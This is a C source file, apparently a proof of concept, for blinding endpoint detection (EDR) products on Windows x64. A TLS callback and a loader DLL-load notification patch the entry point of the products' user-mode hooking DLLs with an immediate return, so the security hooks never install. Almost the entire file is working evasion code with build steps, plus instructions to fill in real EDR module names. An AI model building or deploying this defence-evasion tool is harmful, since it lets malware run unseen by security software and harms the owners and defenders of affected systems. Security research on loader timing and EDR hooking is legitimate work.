/*
 * ========================================================================
 *  PRECUT  --  TLS callback entry-point stubbing PoC
 * ========================================================================
 *
 * Minimal proof-of-concept: no console output, no marks, no report.
 * Two functions and one fact of loader timing:
 *
 *   tls_callback   runs inside LdrpInitializeProcess, BEFORE the loader
 *                  calls NtTestAlert. At this point, EDR user-mode hooking
 *                  DLLs delivered via queued APCs are not yet mapped --
 *                  their delivery APC still waits behind that call. The
 *                  callback stubs anything already mapped (Write A,
 *                  normally zero hits) and registers a load notification.
 *
 *   on_dll_loaded  fires for every later DLL map, after the map and
 *                  BEFORE the loader calls the DLL's entry point. For a
 *                  matching image it overwrites AddressOfEntryPoint with
 *
 *                      B8 01 00 00 00 C3     mov eax, 1 ; ret
 *
 *                  The loader then calls the entry it was always going
 *                  to call; it returns 1 immediately. Real DllMain never
 *                  runs, the hooking routines are never planted, and no
 *                  inline hook (E9) lands in ntdll / KERNELBASE.
 *                  The images stay mapped.
 *
 * Verification on a lab VM: read ntdll!NtProtectVirtualMemory before and
 * after -- a clean stub keeps 4C 8B D1 B8 (byte +3 never replaced).
 *
 * main returns immediately. If you want the process to stay alive for
 * WinDbg inspection, add a Sleep or a MessageBox there yourself.
 *
 * Build: open PrecutCore.sln (VS2022, v143) and build Release|x64, or
 * build with MSBuild. /MT and /INCLUDE:_tls_used are set in the project
 * and forced from this file as well. x64 only.
 *
 * NOTE: This PoC ships with placeholder DLL names. Replace the prefixes
 * and exact names in is_hooking_dll() with the actual target module
 * names from your lab environment before building. The technique itself
 * is generic -- any EDR that delivers its user-mode hooks via APC after
 * EXE TLS has the same window.
 *
 * Lab use only. Not production.
 */

/* Strip rarely-used headers to speed up compilation */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>

/* Hard-stop on 32-bit builds -- all offsets and the gs:[0x60] PEB read
 * below are x64-specific */
#ifndef _WIN64
#error x64 only.
#endif

/* ========================================================================
 *  Loader notification types (ntdll, not in the SDK headers)
 * ========================================================================
 * LdrRegisterDllNotification stores a function pointer; the loader then
 * calls it on every DLL map. Reason LOADED arrives after the image is
 * mapped and before LdrpCallInitRoutine calls its DllMain -- the gap this
 * PoC lives in. The structs mirror what the loader hands over; they are
 * stable on Windows 10/11 but appear in no SDK header.
 */

typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA {
    ULONG           Flags;
    PUNICODE_STRING FullDllName;
    PUNICODE_STRING BaseDllName;
    PVOID           DllBase;
    ULONG           SizeOfImage;
} LDR_DLL_LOADED_NOTIFICATION_DATA;

typedef union _LDR_DLL_NOTIFICATION_DATA {
    LDR_DLL_LOADED_NOTIFICATION_DATA Loaded;
} LDR_DLL_NOTIFICATION_DATA, *PLDR_DLL_NOTIFICATION_DATA;

#define LDR_DLL_NOTIFICATION_REASON_LOADED 1

typedef VOID (CALLBACK *PLDR_DLL_NOTIFICATION_FUNCTION)(
    ULONG                      NotificationReason,
    PLDR_DLL_NOTIFICATION_DATA NotificationData,
    PVOID                      Context);

typedef NTSTATUS (NTAPI *fnLdrRegisterDllNotification)(
    ULONG                          Flags,
    PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
    PVOID                          Context,
    PVOID                         *Cookie);

typedef struct _PC_LDR {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} PC_LDR;

static VOID CALLBACK on_dll_loaded(
    ULONG reason, PLDR_DLL_NOTIFICATION_DATA data, PVOID ctx);

/* ========================================================================
 *  Name matching
 * ======================================================================== */

static wchar_t fold(wchar_t c)
{
    return (c >= L'A' && c <= L'Z') ? (wchar_t)(c + 32) : c;
}

static int copy_uname(const UNICODE_STRING *u, wchar_t *out, int cap)
{
    int n, i;
    if (!u || !u->Buffer || u->Length == 0 || cap < 2) return 0;
    n = (int)(u->Length / sizeof(wchar_t));
    if (n >= cap) n = cap - 1;
    for (i = 0; i < n; i++) out[i] = u->Buffer[i];
    out[n] = 0;
    return n;
}

static int prefix_dll(const wchar_t *name, const wchar_t *prefix)
{
    int i = 0, n = 0;
    if (!name || !prefix) return 0;
    while (prefix[i]) {
        if (fold(name[i]) != fold(prefix[i])) return 0;
        i++;
    }
    if (!name[i]) return 0;
    while (name[n]) n++;
    if (n < 4) return 0;
    return fold(name[n-4]) == L'.' && fold(name[n-3]) == L'd'
        && fold(name[n-2]) == L'l' && fold(name[n-1]) == L'l';
}

static int wicmp(const wchar_t *a, const wchar_t *b)
{
    while (*a && *b) {
        wchar_t la = fold(*a), lb = fold(*b);
        if (la != lb) return (int)(la - lb);
        a++; b++;
    }
    return (int)(fold(*a) - fold(*b));
}

/*
 * ========================================================================
 *  TARGET DLL MATCHING
 * ========================================================================
 *
 * Replace the placeholder prefixes and exact names below with the actual
 * DLL basenames from the EDR product you are analyzing in your lab.
 *
 * EDR products inject user-mode hooking engines via different module
 * names. Common patterns:
 *
 *   - A prefix-versioned DLL (e.g. "edr_hook12345.dll") matched by
 *     prefix_dll() -- catches any build/version suffix.
 *
 *   - An exact-name DLL (e.g. "edrclient64.dll") matched by wicmp()
 *     for a case-insensitive full-name compare.
 *
 * The example entries below are non-functional placeholders.
 */
static int is_hooking_dll(const wchar_t *basename)
{
    /* ---- Placeholder A: prefix match for a versioned hooking module ---- */
    /* Example: an EDR that ships "edr_hookNNNNN.dll" where NNNNN is a
     * build number. Replace "edr_hook" with the real prefix. */
    if (prefix_dll(basename, L"edr_hook"))     return 1;

    /* ---- Placeholder B: prefix match for a second component ----------- */
    /* Example: a companion device-interface DLL named "edr_devNNNNN.dll".
     * Replace "edr_dev" with the real prefix. */
    if (prefix_dll(basename, L"edr_dev"))      return 1;

    /* ---- Placeholder C: exact match for a client module --------------- */
    /* Example: an in-process client injected early. Replace with the real
     * 64-bit and 32-bit basenames. */
    if (wicmp(basename, L"edrclient64.dll") == 0) return 1;
    if (wicmp(basename, L"edrclient.dll") == 0)   return 1;

    return 0;
}

/* ========================================================================
 *  The write
 * ======================================================================== */

static void stub_entry(PVOID dll_base)
{
    BYTE *base = (BYTE *)dll_base;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    DWORD ep_rva, old;
    BYTE *ep;
    static const BYTE stub[6] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };

    if (!base) return;
    dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    ep_rva = nt->OptionalHeader.AddressOfEntryPoint;
    if (!ep_rva || (SIZE_T)ep_rva + 6 > nt->OptionalHeader.SizeOfImage)
        return;
    ep = base + ep_rva;

    if (ep[0] == 0xB8 && ep[1] == 0x01 && ep[2] == 0x00 &&
        ep[3] == 0x00 && ep[4] == 0x00 && ep[5] == 0xC3)
        return;

    if (!VirtualProtect(ep, sizeof(stub), PAGE_EXECUTE_READWRITE, &old))
        return;
    CopyMemory(ep, stub, sizeof(stub));
    VirtualProtect(ep, sizeof(stub), old, &old);
}

/* Write A: stub every matching image that is ALREADY mapped at EXE TLS
 * time. Under the target timing window the loader list holds none of
 * the hooking DLLs yet -- this walk is the safety net, not the method. */
static void peb_stub_loaded(void)
{
    PPEB peb = (PPEB)__readgsqword(0x60);
    LIST_ENTRY *head, *cur;
    if (!peb || !peb->Ldr) return;
    head = &peb->Ldr->InMemoryOrderModuleList;
    for (cur = head->Flink; cur != head; cur = cur->Flink) {
        PC_LDR *mod = CONTAINING_RECORD(cur, PC_LDR, InMemoryOrderLinks);
        wchar_t name[256];
        if (!copy_uname(&mod->BaseDllName, name, 256)) continue;
        if (is_hooking_dll(name) && mod->DllBase)
            stub_entry(mod->DllBase);
    }
}

/* Write B: the notification. Runs in LdrpSendDllNotifications, after
 * EXE TLS returned and NtTestAlert mapped the image, before
 * LdrpCallInitRoutine calls the real entry point. */
static VOID CALLBACK on_dll_loaded(
    ULONG reason, PLDR_DLL_NOTIFICATION_DATA data, PVOID ctx)
{
    wchar_t name[256];
    (void)ctx;
    if (reason != LDR_DLL_NOTIFICATION_REASON_LOADED) return;
    if (!data || !data->Loaded.BaseDllName) return;
    if (!copy_uname(data->Loaded.BaseDllName, name, 256)) return;
    if (!is_hooking_dll(name)) return;
    stub_entry(data->Loaded.DllBase);
}

static void arm_notification(void)
{
    HMODULE ntdll;
    fnLdrRegisterDllNotification p_reg;
    PVOID cookie = NULL;

    ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return;
    p_reg = (fnLdrRegisterDllNotification)GetProcAddress(
        ntdll, "LdrRegisterDllNotification");
    if (!p_reg) return;
    p_reg(0, on_dll_loaded, NULL, &cookie);
}

/* ========================================================================
 *  TLS callback and plumbing
 * ======================================================================== */

static void NTAPI tls_callback(PVOID h, DWORD reason, PVOID r)
{
    (void)h; (void)r;
    if (reason != DLL_PROCESS_ATTACH) return;
    peb_stub_loaded();
    arm_notification();
}

#ifdef _MSC_VER
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma section(".CRT$XLB", long, read)
__declspec(allocate(".CRT$XLB")) PIMAGE_TLS_CALLBACK g_tls_cb = tls_callback;
__declspec(thread) static volatile int g_tls_sentinel = 0;
#else
#error Build with MSVC /MT so the PE has a TLS directory.
#endif

int main(void)
{
    (void)g_tls_sentinel;
    return 0;
}
